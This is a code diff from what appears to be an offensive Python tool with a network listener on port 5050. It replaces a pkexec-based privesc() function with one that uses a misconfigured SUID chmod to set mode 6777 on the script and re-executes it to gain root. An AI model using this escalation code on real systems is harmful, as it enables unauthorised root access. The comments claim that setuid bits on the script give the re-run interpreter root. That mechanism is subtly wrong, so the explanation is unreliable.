@@ -47,15 +47,23 @@ def run_command(cmd, shell=True, capture_output=True, **kwargs):
 HOST, PORT = "0.0.0.0", 5050
 
 def privesc():
-    # Check if we are not already root (UID 0)
-    if os.getuid() != 0:
-        print("Elevating to root...")
-        # Use Popen to launch the new privileged process without blocking
-        # "" recommends subprocess.Popen([sys.executable, THIS_FILE])
-        subprocess.Popen(["pkexec", sys.executable, THIS_FILE])
-        
-        # Exit this unprivileged instance so the new root one takes over
-        sys.exit(0)
+    # Check if we are already root (Effective UID 0)
+    if os.geteuid() != 0:
+        print("Elevating to root using misconfigured chmod...")
+        try:
+            # 1. Use the SUID chmod to set the SUID/SGID bits on THIS file
+            # Since /usr/bin/chmod is SUID root, it can change permissions on any file.
+            subprocess.run(["/usr/bin/chmod", "6777", THIS_FILE], check=True)
+            
+            # 2. Re-execute the script
+            # Because of the 6777 bits, the OS loader will now assign root EUID to the new process.
+            # We use os.execv to replace the current process image in memory.
+            os.execv(sys.executable, [sys.executable, THIS_FILE])
+        except Exception as e:
+            print(f"Failed to elevate: {e}")
+            sys.exit(1)
+    else:
+        print("Already running with root privileges.")
  
 def kill_others():
     """
